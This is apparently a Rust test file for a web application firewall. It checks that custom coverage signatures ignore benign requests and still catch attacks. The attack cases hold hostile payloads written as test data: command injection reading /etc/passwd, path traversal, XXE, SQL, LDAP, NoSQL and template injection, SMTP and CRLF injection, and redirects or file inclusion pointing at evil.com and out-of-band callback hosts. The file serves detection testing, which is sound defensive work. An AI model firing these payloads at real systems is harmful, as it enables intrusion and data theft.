//! False-positive guard for `rules/custom/coverage.conf`.
//!
//! Why this file exists: the 16 coverage signatures (ids 99002xx) are loaded
//! for EVERY site that is not switched off (`control-plane` loads the file
//! unconditionally), and they originally carried a bare `block` action. A bare
//! `block` sets the decision inside the rule VM during phase 1, which returns
//! before `apply_verdict` — the only place the n-gram classifier can veto a
//! weak-evidence block. So these rules could hard-403 a request no matter what
//! every other engine thought, and several of their patterns matched ordinary
//! English words at the start of a parameter value (`fetch`, `idle`, `turn`,
//! `login`, `quit`, `data`), the word `confirm` inside any HTML tag, and
//! `new Date(` in any posted script.
//!
//! Nothing caught it: the benchmark corpus contains none of those words in
//! those positions, and the only live demo site runs in learning mode, where a
//! would-be block is recorded instead of served.
//!
//! The test asserts BOTH directions on purpose. Loosening a signature until the
//! benign half passes is only correct if the attack half still fires, so every
//! relaxation here is bounded by `coverage_rules_still_catch_their_attack_class`.

mod common;

use common::{make_get_ctx, make_post_ctx};
use sentinel_core::context::{Phase, RequestContext, WafDecision};
use sentinel_rules::RuleEngine;
use std::path::{Path, PathBuf};

fn custom_rules_path() -> PathBuf {
    // CARGO_MANIFEST_DIR = crates/sentinel-rules; workspace root is two up.
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/custom/coverage.conf")
}

/// Compile `rules/custom/coverage.conf` alone, so a failure here names the
/// coverage signatures rather than some CRS rule that happened to also match.
fn coverage_engine() -> RuleEngine {
    let path = custom_rules_path();
    let source = std::fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("failed to read {}: {}", path.display(), e));
    let file = sentinel_rules::import_secrule_conf_dir(&source, path.parent())
        .unwrap_or_else(|e| panic!("failed to import {}: {}", path.display(), e));
    let ruleset = sentinel_rules::compile(file)
        .unwrap_or_else(|e| panic!("failed to compile {}: {}", path.display(), e));
    RuleEngine::new(ruleset)
}

fn eval(engine: &RuleEngine, ctx: &mut RequestContext) {
    engine.evaluate(ctx, Phase::RequestHeaders, 0);
    engine.evaluate(ctx, Phase::RequestBody, 0);
}

/// Ordinary traffic that must never be touched by a coverage signature.
///
/// Each entry is (description, context). These are deliberately mundane: query
/// parameters an average application uses, and body text an average user types.
fn benign_cases() -> Vec<(&'static str, RequestContext)> {
    vec![
        // --- 9900218 must not fire on ordinary wildcard-DNS dev hostnames.
        (
            "wildcard dns hostname used in development",
            make_get_ctx("/go?next=http%3A%2F%2F127.0.0.1.nip.io%3A8080%2F"),
        ),
        ("an ordinary browser user-agent", {
            let mut c = make_get_ctx("/");
            c.request_headers.insert(
                "user-agent",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36"
                    .parse()
                    .unwrap(),
            );
            c
        }),
        // --- 9900217, mail injection. A newline is not an attack; a newline
        // --- followed by a STANDALONE mail verb is.
        (
            "multi-line message whose second line starts with the word data",
            make_get_ctx("/note?body=see%20below%0D%0Adata%20collected%20from%20users%20in%20May"),
        ),
        (
            "prose containing a line that begins with to",
            make_get_ctx("/note?body=hello%0D%0Ato%20whom%20it%20may%20concern"),
        ),
        (
            "quoted email thread with a To header the user pasted",
            make_get_ctx("/ticket?body=forwarding%20this%3A%0D%0ATo%3A%20support%40example.com"),
        ),
        (
            "plain multi-line address block",
            make_get_ctx("/addr?v=12%20High%20Street%0D%0ALondon%0D%0AUK"),
        ),
        // --- 9900216, protocol-relative URLs. A `//` only matters when it
        // --- starts the value AND is followed by something domain-shaped.
        (
            "sloppy path with a doubled slash in the middle",
            make_get_ctx("/img?path=%2Fassets%2F%2Flogo.png"),
        ),
        (
            "leading double slash but no host at all",
            make_get_ctx("/files?path=%2F%2Fuploads%2Freport"),
        ),
        (
            "a line of code that begins with a comment marker",
            make_get_ctx("/snippet?code=%2F%2F%20TODO%20fix%20this%20later"),
        ),
        (
            "base64 whose alphabet contains a doubled slash",
            make_get_ctx("/d?blob=SGVsbG8vL3dvcmxkIGZyb20gYmFzZTY0"),
        ),
        (
            "windows UNC share, no dotted host",
            make_get_ctx("/open?unc=%5C%5Cfileserver%5Cshare"),
        ),
        (
            "an ordinary absolute URL that carries its scheme",
            make_get_ctx("/go?next=https%3A%2F%2Fshop.example.com%2Fcart"),
        ),
        (
            "AJAX action parameter literally named fetch",
            make_get_ctx("/api/items?action=fetch"),
        ),
        (
            "status parameter with the value idle",
            make_get_ctx("/api/session?state=idle"),
        ),
        (
            "directions text beginning with the word turn",
            make_get_ctx("/maps?dir=turn%20left%20at%20the%20lights"),
        ),
        (
            "login and logout as ordinary action values",
            make_get_ctx("/account?action=login&next=logout"),
        ),
        (
            "a search box containing the word quit",
            make_get_ctx("/search?q=how%20to%20quit%20smoking"),
        ),
        (
            "an export endpoint whose mode is data",
            make_get_ctx("/export?mode=data&format=csv"),
        ),
        (
            "a relative image path in a parameter",
            make_get_ctx("/render?img=../assets/logo.png"),
        ),
        (
            "prose asking how to fetch from an API",
            make_get_ctx("/search?q=how%20to%20fetch%20data%20from%20an%20api"),
        ),
        (
            "an order confirmation message",
            make_get_ctx("/checkout?msg=Please%20confirm%20your%20order"),
        ),
        (
            "a posted comment containing a JavaScript date",
            make_post_ctx("/comments", "body=var%20t%20%3D%20new%20Date%28%29%3B"),
        ),
        (
            "a quoted email reply in a textarea",
            make_post_ctx(
                "/tickets",
                "body=From%3A%20Alice%0D%0AHi%2C%20any%20update%3F",
            ),
        ),
        (
            "a ticket reply whose second line begins with Subject",
            make_post_ctx(
                "/tickets",
                "text=Hi%0D%0ASubject%3A%20Re%3A%20order%20123%0D%0Athanks",
            ),
        ),
        (
            "a forwarded message quoting a From line",
            make_post_ctx("/tickets", "text=Regards%0D%0AFrom%3A%20Alice%20Chen"),
        ),
        (
            "an HTML snippet pasted into a CMS field",
            make_post_ctx(
                "/pages",
                "html=%3Cinput%20type%3D%22submit%22%20value%3D%22Confirm%20order%22%3E",
            ),
        ),
        (
            "a support note containing a contact header",
            make_post_ctx("/notes", "text=Contact%3A%20support%40example.com"),
        ),
        (
            "a namespace field on a settings form",
            make_get_ctx("/settings?namespace=production"),
        ),
        (
            "an append-mode upload parameter",
            make_get_ctx("/upload?mode=append&status=messages"),
        ),
    ]
}

/// The attack classes this file exists to cover. CRS 4.x scores near zero on
/// these, which is the whole reason the coverage signatures were written, so a
/// regression here costs real detection.
fn attack_cases() -> Vec<(&'static str, RequestContext)> {
    vec![
        // --- 9900218. The payload is unremarkable; the callback host is the tell.
        ("OAST callback host appended to a browser user-agent", {
            let mut c = make_get_ctx("/");
            c.request_headers.insert(
                "user-agent",
                "Mozilla/5.0 (Windows NT 6.1) Chrome/55.0 Safari/537.36 root@w63gec.interact.sh"
                    .parse()
                    .unwrap(),
            );
            c
        }),
        (
            "blind SSRF pointing at a collaborator host",
            make_get_ctx("/fetch?url=http%3A%2F%2Fabc123.burpcollaborator.net%2Fx"),
        ),
        (
            "dns exfiltration host in a parameter",
            make_get_ctx("/q?v=data.dnslog.cn"),
        ),
        // --- 9900217. All seven GoTestWAF bypasses were this one payload;
        // --- each encoding and placement is represented here.
        (
            "SMTP QUIT injected url-encoded",
            make_get_ctx("/mail?to=%0D%0AQUIT%0D%0A"),
        ),
        (
            "SMTP QUIT injected base64",
            make_get_ctx("/mail?to=DQpRVUlUDQo"),
        ),
        (
            "SMTP QUIT base64 in the url path",
            make_get_ctx("/DQpRVUlUDQo"),
        ),
        (
            "envelope rewrite via RCPT TO",
            make_get_ctx("/mail?to=x%40y.com%0D%0ARCPT%20TO%3A%20victim%40elsewhere.com"),
        ),
        (
            "blind carbon copy header injection",
            make_get_ctx("/contact?email=a%40b.com%0D%0ABcc%3A%20everyone%40example.com"),
        ),
        (
            "SMTP session reset",
            make_post_ctx("/contact", "msg=hi%0D%0ARSET%0D%0A"),
        ),
        // --- 9900216. Each of these returned 200 with NO rule firing before
        // --- this signature existed; the scheme-ful form was already a 403.
        (
            "protocol-relative open redirect",
            make_get_ctx("/go?next=%2F%2Fevil.com"),
        ),
        (
            "protocol-relative RFI with a payload path",
            make_get_ctx("/inc?file=%2F%2Fevil.com%2Fshell.php"),
        ),
        (
            "protocol-relative with a trailing slash",
            make_get_ctx("/go?next=%2F%2Fevil.com%2F"),
        ),
        (
            "backslash variant a browser normalises to //",
            make_get_ctx("/go?next=%5C%5Cattacker.tld%2Fa"),
        ),
        (
            "userinfo used to disguise the real host",
            make_get_ctx("/go?next=%2F%2Fgood.example.com%40evil.com%2F"),
        ),
        (
            "extra leading slashes",
            make_get_ctx("/go?next=%2F%2F%2Fevil.com%2Fx"),
        ),
        (
            "CRLF response splitting",
            make_get_ctx("/redir?url=http%3A%2F%2Fx%2F%0D%0ASet-Cookie%3A%20admin%3D1"),
        ),
        (
            "LDAP filter injection",
            make_get_ctx("/dir?user=%2A%29%28uid%3D%2A"),
        ),
        (
            "server-side template injection",
            make_get_ctx("/hello?name=%7B%7B7%2A7%7D%7D"),
        ),
        (
            "NoSQL operator injection",
            make_get_ctx("/login?user%5B%24ne%5D=1"),
        ),
        (
            "SMTP command injection",
            make_get_ctx("/mail?to=rcpt%20to%3A%20victim%40example.com"),
        ),
        (
            "OS command injection",
            make_get_ctx("/ping?host=%3Bcat%20%2Fetc%2Fpasswd"),
        ),
        (
            "path traversal to a sensitive file",
            make_get_ctx("/file?f=..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
        ),
        (
            "XXE external entity in a posted body",
            make_post_ctx(
                "/soap",
                "%3C%21DOCTYPE%20foo%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E",
            ),
        ),
        (
            "SQL injection via a JSON function",
            make_get_ctx("/q?id=1%20AND%20JSON_EXTRACT%28a%2C%27%24%27%29"),
        ),
        (
            "time-based SQL injection",
            make_get_ctx("/q?id=1%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27"),
        ),
    ]
}

/// No coverage signature may block ordinary traffic on its own.
///
/// The decision assertion is the load-bearing one: a bare `block` action sets
/// it inside the VM before any other engine is consulted, which is what made
/// this class of bug unreachable by the false-positive suppression layer.
#[test]
fn coverage_rules_do_not_block_ordinary_traffic() {
    let engine = coverage_engine();
    let mut offenders = Vec::new();

    for (what, mut ctx) in benign_cases() {
        eval(&engine, &mut ctx);
        if ctx.decision == WafDecision::Block || !ctx.rule_matches.is_empty() {
            offenders.push(format!(
                "  {what}: decision={:?} score={} rules={:?}",
                ctx.decision,
                ctx.anomaly_score,
                ctx.rule_matches
                    .iter()
                    .map(|m| m.rule_id.as_str())
                    .collect::<Vec<_>>()
            ));
        }
    }

    assert!(
        offenders.is_empty(),
        "coverage signatures fired on ordinary traffic:\n{}",
        offenders.join("\n")
    );
}

/// The other half of the bound: every attack class the file claims to cover
/// must still be detected after any relaxation above.
#[test]
fn coverage_rules_still_catch_their_attack_class() {
    let engine = coverage_engine();
    let mut missed = Vec::new();

    for (what, mut ctx) in attack_cases() {
        eval(&engine, &mut ctx);
        if ctx.rule_matches.is_empty() {
            missed.push(format!("  {what}: not detected"));
        }
    }

    assert!(
        missed.is_empty(),
        "coverage signatures stopped detecting their own attack class:\n{}",
        missed.join("\n")
    );
}

/// A coverage signature must contribute score, never decide on its own.
///
/// This is the structural guard behind the two tests above. `block`/`deny` in
/// the rule VM short-circuits phase 1 and returns before `apply_verdict`, so a
/// single regex outranks the classifier, the per-site threshold and every other
/// engine. Scoring keeps the signature's detection value while leaving the
/// verdict where it belongs.
#[test]
fn coverage_rules_score_rather_than_decide() {
    let path = custom_rules_path();
    let source = std::fs::read_to_string(&path).expect("read coverage.conf");

    let offenders: Vec<&str> = source
        .lines()
        .map(str::trim)
        .filter(|l| {
            let l = l.trim_end_matches('\\').trim_end_matches(',').trim();
            l == "block" || l == "deny" || l == "drop"
        })
        .collect();

    assert!(
        offenders.is_empty(),
        "coverage.conf must not use a decisive action ({} found). Use \
         `pass` with `setvar:tx.anomaly_score=+N` so the verdict is made by \
         apply_verdict, where the false-positive suppression layer runs.",
        offenders.len()
    );
}

/// The product's default anomaly threshold: what the control plane sends for a
/// site that sets none (buildRustWaf, `p.AnomalyThreshold = 10`).
const DEFAULT_THRESHOLD: u32 = 10;

/// Matching is not blocking. `coverage_rules_still_catch_their_attack_class`
/// only asserts a match, and so passed for ten days while every match scored
/// +5 against a default threshold of 10 — a lone signature blocked nothing, and
/// GoTestWAF detection sat at 87% instead of 99%. Each attack must reach the
/// default threshold ON ITS OWN, because these are the classes CRS misses:
/// there is no second signal to add to it.
#[test]
fn a_lone_coverage_match_reaches_the_default_threshold() {
    let engine = coverage_engine();
    let mut short = Vec::new();
    for (what, mut ctx) in attack_cases() {
        eval(&engine, &mut ctx);
        if ctx.anomaly_score < DEFAULT_THRESHOLD && ctx.decision != WafDecision::Block {
            short.push(format!(
                "  {what}: score {} < {DEFAULT_THRESHOLD}",
                ctx.anomaly_score
            ));
        }
    }
    assert!(
        short.is_empty(),
        "coverage matches that cannot block on their own:\n{}",
        short.join("\n")
    );
}

/// Keep DEFAULT_THRESHOLD honest: it must be the value the control plane sends.
#[test]
fn the_default_threshold_is_the_control_planes() {
    let go = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../control-plane/cmd/controllerd/handlers.go"),
    )
    .expect("read handlers.go");
    assert!(
        go.contains(&format!("p.AnomalyThreshold = {DEFAULT_THRESHOLD}")),
        "the control plane's default anomaly threshold is no longer {DEFAULT_THRESHOLD}"
    );
}
